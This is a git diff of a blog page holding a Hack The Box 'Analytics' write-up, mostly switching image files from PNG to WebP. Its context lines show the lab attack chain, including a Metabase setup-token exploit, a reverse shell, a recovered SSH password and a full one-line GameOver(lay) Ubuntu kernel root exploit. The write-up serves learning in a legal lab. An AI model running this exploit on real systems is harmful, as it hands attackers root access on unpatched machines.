@@ -38,16 +38,16 @@
 <link rel="canonical" href="http://localhost:4000/posts/htb-analytics-writeup/" />
 <meta property="og:url" content="http://localhost:4000/posts/htb-analytics-writeup/" />
 <meta property="og:site_name" content="INTROVERTED BYTES" />
-<meta property="og:image" content="http://localhost:4000/assets/img/headers/analytics.png" />
+<meta property="og:image" content="http://localhost:4000/assets/img/headers/analytics.webp" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2024-03-23T17:30:00+00:00" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:image" content="http://localhost:4000/assets/img/headers/analytics.png" />
+<meta property="twitter:image" content="http://localhost:4000/assets/img/headers/analytics.webp" />
 <meta property="twitter:title" content="Hack The Box Analytics Writeup" />
 <meta name="twitter:site" content="@kasyapgirijan" />
 <meta name="twitter:creator" content="@kasyapgirijan" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Kasyap Girijan","url":"https://github.com/kasyapgirijan/"},"dateModified":"2025-02-03T16:21:30+00:00","datePublished":"2024-03-23T17:30:00+00:00","description":"Summary: Analytics is a vulnerable Linux machine on HackTheBox. Basic web enumeration techniques expose a login page on a Metabase subdomain.","headline":"Hack The Box Analytics Writeup","image":{"lqip":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAABhWlDQ1BJQ0MgUHJvZmlsZQAAeJx9kT1Iw0AcxV9TpUUqDhYUcchQBcGCqBRHrUIRKpRaoVUHk0u/oElDkuLiKLgWHPxYrDq4OOvq4CoIgh8gzg5Oii5S4v+SQosYD4778e7e4+4dIDQqTDW7JgBVs4x0Ii5mc6ti4BV+DCCIGMYkZupzqVQSnuPrHj6+3kV5lve5P0evkjcZ4BOJZ5luWMQbxLFNS+e8TxxmJUkhPiceN+iCxI9cl11+41x0WOCZYSOTnicOE4vFDpY7mJUMlXiaOKKoGuULWZcVzluc1UqNte7JXxjKayvLXKc5jAQWsYQURMiooYwKLERp1Ugxkab9uId/yPGnyCWTqwxGjgVUoUJy/OB/8LtbszA16SaF4kD3i21/jACBXaBZt+3vY9tungD+Z+BKa/urDWDmk/R6W4scAX3bwMV1W5P3gMsdYPBJlwzJkfw0hUIBeD+jb8oB/bdAz5rbW2sfpw9AhrpK3gAHh8BokbLXPd4d7Ozt3zOt/n4AtmZywhxJ/E8AAAM6SURBVHicnZXbbt02EEXXDClROpbjBElQOGmTvPX/P6dF0T4UvSR2mjo+ProNZ/ogJY/1aQkIAgiCs7D3Ho48u/4++B9LdfuLCv0giIItQqyCJkCgakPSBqsGq5HDyUmxcCIFhJD/a2ERiIDxGNQqHAZY5iAlJZaNKhyCoG0aSttintCstOGoCKdlZawVhfMBmiJcDJnDRUs/DFz1mbZREMGqMx8fOC4r41iZRlhnwasxjUYSxQVGB6+2yeMQnKmACHR9ouSGkjouuoGnneAeBErpEulkTDXIIbTFqWsQIahCUkFF8AhEhPAgodSIxwEiIDXQ9ZlWWrqm8PTZwKunwTwFjiJdw/0ycXc0tELTwJKddd7ucAIUPAKPgAisOiJ6ngKqULrMZTvw4vVzXn3/DW9eCvd3GZdEfgLjE2VJHR/eH3mweyQ5EVsW9ppfPxAiNmUfB9h7JGeh9B2pPTCRmbSQ0kvUBbNbLKCUA4dDZR4fUBFEtiICCLLbKfu9AnEOwHaOWoPqwTyv3NzccpkL15fPcZQ/Pn3k7vZvlrkDEQJFVBEN+AIgW3HZiSIcSI8DCFtbrYtj4SzTyvjnyE3NvHjzF5Eynz7c8fFmpI+CC1QXag2CzfcgttTHDhPQNC0Rfp4C1WAcV9arFRrFteXjDL8dVzTDqSakH2i1MN0vWA2qAQoRghNEBLJtgcBwdUGc0wXbeWE6OZ/vj9AWrBPG6ji/k3PmND6ArZzixMN0YpkDD0FUILYwugdpt0DYLDirC1JSSinklGBVtBpXTY8lI8VCcuOggjcJnx28oWkPlFgwM8x8UyECFQHdI7mH8V8BIgIVRVWp1Tndz4gLPhmSK5SRlDPhgtVtFixTbBqrEgLmjoez7krgWxg7hHgM4Muq1TEzIgL3YF4q7gYitE2DJkWzfpXaQ7DYQhhA3R8gj8Al0Ni74DELRASrlWmeeff2O0oplLZlNePb19e8f3/L23fX/Pzrj1wOA1kGrL9kejjyyw8/IUkYbUX398CqsVpwWXoCMFuRc8axiLAsK9Xr1xCZVdrS0uaG0JWmD3Bh9QJNz7O+Z7aFz9NpG93uhDsewZPSc8gtixn/AMVq7JMcOEpfAAAAAElFTkSuQmCC","url":"http://localhost:4000/assets/img/headers/analytics.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/htb-analytics-writeup/"},"url":"http://localhost:4000/posts/htb-analytics-writeup/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Kasyap Girijan","url":"https://github.com/kasyapgirijan/"},"dateModified":"2025-02-03T16:21:30+00:00","datePublished":"2024-03-23T17:30:00+00:00","description":"Summary: Analytics is a vulnerable Linux machine on HackTheBox. Basic web enumeration techniques expose a login page on a Metabase subdomain.","headline":"Hack The Box Analytics Writeup","image":{"lqip":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAABhWlDQ1BJQ0MgUHJvZmlsZQAAeJx9kT1Iw0AcxV9TpUUqDhYUcchQBcGCqBRHrUIRKpRaoVUHk0u/oElDkuLiKLgWHPxYrDq4OOvq4CoIgh8gzg5Oii5S4v+SQosYD4778e7e4+4dIDQqTDW7JgBVs4x0Ii5mc6ti4BV+DCCIGMYkZupzqVQSnuPrHj6+3kV5lve5P0evkjcZ4BOJZ5luWMQbxLFNS+e8TxxmJUkhPiceN+iCxI9cl11+41x0WOCZYSOTnicOE4vFDpY7mJUMlXiaOKKoGuULWZcVzluc1UqNte7JXxjKayvLXKc5jAQWsYQURMiooYwKLERp1Ugxkab9uId/yPGnyCWTqwxGjgVUoUJy/OB/8LtbszA16SaF4kD3i21/jACBXaBZt+3vY9tungD+Z+BKa/urDWDmk/R6W4scAX3bwMV1W5P3gMsdYPBJlwzJkfw0hUIBeD+jb8oB/bdAz5rbW2sfpw9AhrpK3gAHh8BokbLXPd4d7Ozt3zOt/n4AtmZywhxJ/E8AAAM6SURBVHicnZXbbt02EEXXDClROpbjBElQOGmTvPX/P6dF0T4UvSR2mjo+ProNZ/ogJY/1aQkIAgiCs7D3Ho48u/4++B9LdfuLCv0giIItQqyCJkCgakPSBqsGq5HDyUmxcCIFhJD/a2ERiIDxGNQqHAZY5iAlJZaNKhyCoG0aSttintCstOGoCKdlZawVhfMBmiJcDJnDRUs/DFz1mbZREMGqMx8fOC4r41iZRlhnwasxjUYSxQVGB6+2yeMQnKmACHR9ouSGkjouuoGnneAeBErpEulkTDXIIbTFqWsQIahCUkFF8AhEhPAgodSIxwEiIDXQ9ZlWWrqm8PTZwKunwTwFjiJdw/0ycXc0tELTwJKddd7ucAIUPAKPgAisOiJ6ngKqULrMZTvw4vVzXn3/DW9eCvd3GZdEfgLjE2VJHR/eH3mweyQ5EVsW9ppfPxAiNmUfB9h7JGeh9B2pPTCRmbSQ0kvUBbNbLKCUA4dDZR4fUBFEtiICCLLbKfu9AnEOwHaOWoPqwTyv3NzccpkL15fPcZQ/Pn3k7vZvlrkDEQJFVBEN+AIgW3HZiSIcSI8DCFtbrYtj4SzTyvjnyE3NvHjzF5Eynz7c8fFmpI+CC1QXag2CzfcgttTHDhPQNC0Rfp4C1WAcV9arFRrFteXjDL8dVzTDqSakH2i1MN0vWA2qAQoRghNEBLJtgcBwdUGc0wXbeWE6OZ/vj9AWrBPG6ji/k3PmND6ArZzixMN0YpkDD0FUILYwugdpt0DYLDirC1JSSinklGBVtBpXTY8lI8VCcuOggjcJnx28oWkPlFgwM8x8UyECFQHdI7mH8V8BIgIVRVWp1Tndz4gLPhmSK5SRlDPhgtVtFixTbBqrEgLmjoez7krgWxg7hHgM4Muq1TEzIgL3YF4q7gYitE2DJkWzfpXaQ7DYQhhA3R8gj8Al0Ni74DELRASrlWmeeff2O0oplLZlNePb19e8f3/L23fX/Pzrj1wOA1kGrL9kejjyyw8/IUkYbUX398CqsVpwWXoCMFuRc8axiLAsK9Xr1xCZVdrS0uaG0JWmD3Bh9QJNz7O+Z7aFz9NpG93uhDsewZPSc8gtixn/AMVq7JMcOEpfAAAAAElFTkSuQmCC","url":"http://localhost:4000/assets/img/headers/analytics.webp","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/htb-analytics-writeup/"},"url":"http://localhost:4000/posts/htb-analytics-writeup/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -1457,7 +1457,7 @@
         
 
         <div class="mt-3 mb-3">
-          <a href="/assets/img/headers/analytics.png" class="popup img-link preview-img blur"><img data-src="/assets/img/headers/analytics.png"  alt="Preview Image" width="1200" height="630" data-lqip="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAABhWlDQ1BJQ0MgUHJvZmlsZQAAeJx9kT1Iw0AcxV9TpUUqDhYUcchQBcGCqBRHrUIRKpRaoVUHk0u/oElDkuLiKLgWHPxYrDq4OOvq4CoIgh8gzg5Oii5S4v+SQosYD4778e7e4+4dIDQqTDW7JgBVs4x0Ii5mc6ti4BV+DCCIGMYkZupzqVQSnuPrHj6+3kV5lve5P0evkjcZ4BOJZ5luWMQbxLFNS+e8TxxmJUkhPiceN+iCxI9cl11+41x0WOCZYSOTnicOE4vFDpY7mJUMlXiaOKKoGuULWZcVzluc1UqNte7JXxjKayvLXKc5jAQWsYQURMiooYwKLERp1Ugxkab9uId/yPGnyCWTqwxGjgVUoUJy/OB/8LtbszA16SaF4kD3i21/jACBXaBZt+3vY9tungD+Z+BKa/urDWDmk/R6W4scAX3bwMV1W5P3gMsdYPBJlwzJkfw0hUIBeD+jb8oB/bdAz5rbW2sfpw9AhrpK3gAHh8BokbLXPd4d7Ozt3zOt/n4AtmZywhxJ/E8AAAM6SURBVHicnZXbbt02EEXXDClROpbjBElQOGmTvPX/P6dF0T4UvSR2mjo+ProNZ/ogJY/1aQkIAgiCs7D3Ho48u/4++B9LdfuLCv0giIItQqyCJkCgakPSBqsGq5HDyUmxcCIFhJD/a2ERiIDxGNQqHAZY5iAlJZaNKhyCoG0aSttintCstOGoCKdlZawVhfMBmiJcDJnDRUs/DFz1mbZREMGqMx8fOC4r41iZRlhnwasxjUYSxQVGB6+2yeMQnKmACHR9ouSGkjouuoGnneAeBErpEulkTDXIIbTFqWsQIahCUkFF8AhEhPAgodSIxwEiIDXQ9ZlWWrqm8PTZwKunwTwFjiJdw/0ycXc0tELTwJKddd7ucAIUPAKPgAisOiJ6ngKqULrMZTvw4vVzXn3/DW9eCvd3GZdEfgLjE2VJHR/eH3mweyQ5EVsW9ppfPxAiNmUfB9h7JGeh9B2pPTCRmbSQ0kvUBbNbLKCUA4dDZR4fUBFEtiICCLLbKfu9AnEOwHaOWoPqwTyv3NzccpkL15fPcZQ/Pn3k7vZvlrkDEQJFVBEN+AIgW3HZiSIcSI8DCFtbrYtj4SzTyvjnyE3NvHjzF5Eynz7c8fFmpI+CC1QXag2CzfcgttTHDhPQNC0Rfp4C1WAcV9arFRrFteXjDL8dVzTDqSakH2i1MN0vWA2qAQoRghNEBLJtgcBwdUGc0wXbeWE6OZ/vj9AWrBPG6ji/k3PmND6ArZzixMN0YpkDD0FUILYwugdpt0DYLDirC1JSSinklGBVtBpXTY8lI8VCcuOggjcJnx28oWkPlFgwM8x8UyECFQHdI7mH8V8BIgIVRVWp1Tndz4gLPhmSK5SRlDPhgtVtFixTbBqrEgLmjoez7krgWxg7hHgM4Muq1TEzIgL3YF4q7gYitE2DJkWzfpXaQ7DYQhhA3R8gj8Al0Ni74DELRASrlWmeeff2O0oplLZlNePb19e8f3/L23fX/Pzrj1wOA1kGrL9kejjyyw8/IUkYbUX398CqsVpwWXoCMFuRc8axiLAsK9Xr1xCZVdrS0uaG0JWmD3Bh9QJNz7O+Z7aFz9NpG93uhDsewZPSc8gtixn/AMVq7JMcOEpfAAAAAElFTkSuQmCC"></a></div>
+          <a href="/assets/img/headers/analytics.webp" class="popup img-link preview-img blur"><img data-src="/assets/img/headers/analytics.webp"  alt="Preview Image" width="1200" height="630" data-lqip="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAABhWlDQ1BJQ0MgUHJvZmlsZQAAeJx9kT1Iw0AcxV9TpUUqDhYUcchQBcGCqBRHrUIRKpRaoVUHk0u/oElDkuLiKLgWHPxYrDq4OOvq4CoIgh8gzg5Oii5S4v+SQosYD4778e7e4+4dIDQqTDW7JgBVs4x0Ii5mc6ti4BV+DCCIGMYkZupzqVQSnuPrHj6+3kV5lve5P0evkjcZ4BOJZ5luWMQbxLFNS+e8TxxmJUkhPiceN+iCxI9cl11+41x0WOCZYSOTnicOE4vFDpY7mJUMlXiaOKKoGuULWZcVzluc1UqNte7JXxjKayvLXKc5jAQWsYQURMiooYwKLERp1Ugxkab9uId/yPGnyCWTqwxGjgVUoUJy/OB/8LtbszA16SaF4kD3i21/jACBXaBZt+3vY9tungD+Z+BKa/urDWDmk/R6W4scAX3bwMV1W5P3gMsdYPBJlwzJkfw0hUIBeD+jb8oB/bdAz5rbW2sfpw9AhrpK3gAHh8BokbLXPd4d7Ozt3zOt/n4AtmZywhxJ/E8AAAM6SURBVHicnZXbbt02EEXXDClROpbjBElQOGmTvPX/P6dF0T4UvSR2mjo+ProNZ/ogJY/1aQkIAgiCs7D3Ho48u/4++B9LdfuLCv0giIItQqyCJkCgakPSBqsGq5HDyUmxcCIFhJD/a2ERiIDxGNQqHAZY5iAlJZaNKhyCoG0aSttintCstOGoCKdlZawVhfMBmiJcDJnDRUs/DFz1mbZREMGqMx8fOC4r41iZRlhnwasxjUYSxQVGB6+2yeMQnKmACHR9ouSGkjouuoGnneAeBErpEulkTDXIIbTFqWsQIahCUkFF8AhEhPAgodSIxwEiIDXQ9ZlWWrqm8PTZwKunwTwFjiJdw/0ycXc0tELTwJKddd7ucAIUPAKPgAisOiJ6ngKqULrMZTvw4vVzXn3/DW9eCvd3GZdEfgLjE2VJHR/eH3mweyQ5EVsW9ppfPxAiNmUfB9h7JGeh9B2pPTCRmbSQ0kvUBbNbLKCUA4dDZR4fUBFEtiICCLLbKfu9AnEOwHaOWoPqwTyv3NzccpkL15fPcZQ/Pn3k7vZvlrkDEQJFVBEN+AIgW3HZiSIcSI8DCFtbrYtj4SzTyvjnyE3NvHjzF5Eynz7c8fFmpI+CC1QXag2CzfcgttTHDhPQNC0Rfp4C1WAcV9arFRrFteXjDL8dVzTDqSakH2i1MN0vWA2qAQoRghNEBLJtgcBwdUGc0wXbeWE6OZ/vj9AWrBPG6ji/k3PmND6ArZzixMN0YpkDD0FUILYwugdpt0DYLDirC1JSSinklGBVtBpXTY8lI8VCcuOggjcJnx28oWkPlFgwM8x8UyECFQHdI7mH8V8BIgIVRVWp1Tndz4gLPhmSK5SRlDPhgtVtFixTbBqrEgLmjoez7krgWxg7hHgM4Muq1TEzIgL3YF4q7gYitE2DJkWzfpXaQ7DYQhhA3R8gj8Al0Ni74DELRASrlWmeeff2O0oplLZlNePb19e8f3/L23fX/Pzrj1wOA1kGrL9kejjyyw8/IUkYbUX398CqsVpwWXoCMFuRc8axiLAsK9Xr1xCZVdrS0uaG0JWmD3Bh9QJNz7O+Z7aFz9NpG93uhDsewZPSc8gtixn/AMVq7JMcOEpfAAAAAElFTkSuQmCC"></a></div>
       
 
       <div class="d-flex justify-content-between">
@@ -1582,13 +1582,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>I swiftly added the host  analytical.htb to /etc/hosts and went back to web application for further enumeration.</p>
 
-<p><a href="/assets/img/htb/analytics/1.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/1.png" alt="img-description" loading="lazy"></a> <em>analytical.htb</em></p>
+<p><a href="/assets/img/htb/analytics/1.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/1.webp" alt="img-description" loading="lazy"></a> <em>analytical.htb</em></p>
 
 <p>As we see there is an option that allow login to the web application, upon visiting the page I was redirected to another page  http:///data.analytical.htb/.</p>
 
 <p>To view the page, we need to add the host to our /etc/hosts.</p>
 
-<p><a href="/assets/img/htb/analytics/2.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/2.png" alt="img-description" loading="lazy"></a> <em>data.analytical.htb</em></p>
+<p><a href="/assets/img/htb/analytics/2.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/2.webp" alt="img-description" loading="lazy"></a> <em>data.analytical.htb</em></p>
 
 <p>Now, as we have the host entry in place, we can see it is a <code class="language-plaintext highlighter-rouge">metabase</code> login page.</p>
 
@@ -1610,7 +1610,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>As described in PoC we would need to obtain the <code class="language-plaintext highlighter-rouge">setup token</code> from /api/session/properties.</p>
 
-<p><a href="/assets/img/htb/analytics/3.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/3.png" alt="img-description" loading="lazy"></a> <em>Setup Token</em></p>
+<p><a href="/assets/img/htb/analytics/3.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/3.webp" alt="img-description" loading="lazy"></a> <em>Setup Token</em></p>
 
 <p>As we have the setup token, we need to replace it in payload with token value.</p>
 
@@ -1668,11 +1668,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 <p>Now, we needs to encode the reverse shell payload into base64, with your own IP and port, before parsing it.</p>
 
-<p><a href="/assets/img/htb/analytics/4.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/4.png" alt="img-description" loading="lazy"></a> <em>Complete Payload</em></p>
+<p><a href="/assets/img/htb/analytics/4.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/4.webp" alt="img-description" loading="lazy"></a> <em>Complete Payload</em></p>
 
 <p>As you can see, we have a reverse shell.</p>
 
-<p><a href="/assets/img/htb/analytics/5.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/5.png" alt="img-description" loading="lazy"></a> <em>NC - Reverse Shell</em></p>
+<p><a href="/assets/img/htb/analytics/5.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/5.webp" alt="img-description" loading="lazy"></a> <em>NC - Reverse Shell</em></p>
 
 <h3 id="method-2-metasploit-module"><span class="me-2">Method 2: Metasploit Module</span><a href="#method-2-metasploit-module" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
 
@@ -1880,7 +1880,7 @@ shell
 </pre></td></tr></tbody></table></code></div></div>
 <p>Using the password <code class="language-plaintext highlighter-rouge">An4lytics_ds20223#</code>, I was able to login to the machine through SSH.</p>
 
-<p><a href="/assets/img/htb/analytics/6.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/6.png" alt="img-description" loading="lazy"></a> _SSH: metalytics _</p>
+<p><a href="/assets/img/htb/analytics/6.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/6.webp" alt="img-description" loading="lazy"></a> _SSH: metalytics _</p>
 
 <p>We now own the user of the machine!.</p>
 
@@ -1890,11 +1890,11 @@ shell
 
 <p>However, it gave that we do not have permission to run <code class="language-plaintext highlighter-rouge">sudo </code>on this machine.</p>
 
-<p><a href="/assets/img/htb/analytics/7.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/7.png" alt="img-description" loading="lazy"></a> <em>sudo -l</em></p>
+<p><a href="/assets/img/htb/analytics/7.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/7.webp" alt="img-description" loading="lazy"></a> <em>sudo -l</em></p>
 
 <p>Further I checked if we have any vulnerability related to OS, so I enter the command uname-a to check system information related to Kernel Release Version, OS.</p>
 
-<p><a href="/assets/img/htb/analytics/8.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/8.png" alt="img-description" loading="lazy"></a> <em>uname -a</em>
+<p><a href="/assets/img/htb/analytics/8.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/8.webp" alt="img-description" loading="lazy"></a> <em>uname -a</em>
 Which revealed that the machine is running on <code class="language-plaintext highlighter-rouge">6.2.0-25-generic</code> kernel version.  With short online research I could find that this version of kernel version is vulnerable to <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main">CVE-2023-2640 and CVE-2023-32629 “GameOver(lay) Ubuntu Privilege Escalation”</a>.</p>
 
 <p>Simply by pasting the payload mentioned in exploit.sh file in machine, we will be elevated to root.</p>
@@ -1904,7 +1904,7 @@ Which revealed that the machine is running on <code class="language-plaintext hi
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre>unshare <span class="nt">-rm</span> sh <span class="nt">-c</span> <span class="s2">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;"</span> <span class="o">&amp;&amp;</span> u/python3 <span class="nt">-c</span> <span class="s1">'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash")'</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p><a href="/assets/img/htb/analytics/9.png" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/9.png" alt="img-description" loading="lazy"></a> <em>rooted</em></p>
+<p><a href="/assets/img/htb/analytics/9.webp" class="popup img-link  shimmer"><img src="/assets/img/htb/analytics/9.webp" alt="img-description" loading="lazy"></a> <em>rooted</em></p>
 
 <p>We have the machine <code class="language-plaintext highlighter-rouge">ROOTED!</code></p>
 
@@ -2059,6 +2059,13 @@ Which revealed that the machine is running on <code class="language-plaintext hi
         
         
         <li class="text-truncate lh-lg">
+          <a href="/posts/exploring_tls_securing_tcp_communication/">Exploring TLS: Securing TCP Communication</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
           <a href="/posts/htb-keeper-writeup/">Hack The Box | Keeper Writeup</a>
         </li>
       
@@ -2081,13 +2088,6 @@ Which revealed that the machine is running on <code class="language-plaintext hi
         
         <li class="text-truncate lh-lg">
           <a href="/posts/htb-manager-writeup/">Hack The Box | Manager Writeup</a>
-        </li>
-      
-        
-        
-        
-        <li class="text-truncate lh-lg">
-          <a href="/posts/htb-analytics-writeup/">Hack The Box | Analytics Writeup</a>
         </li>
       
     </ul>
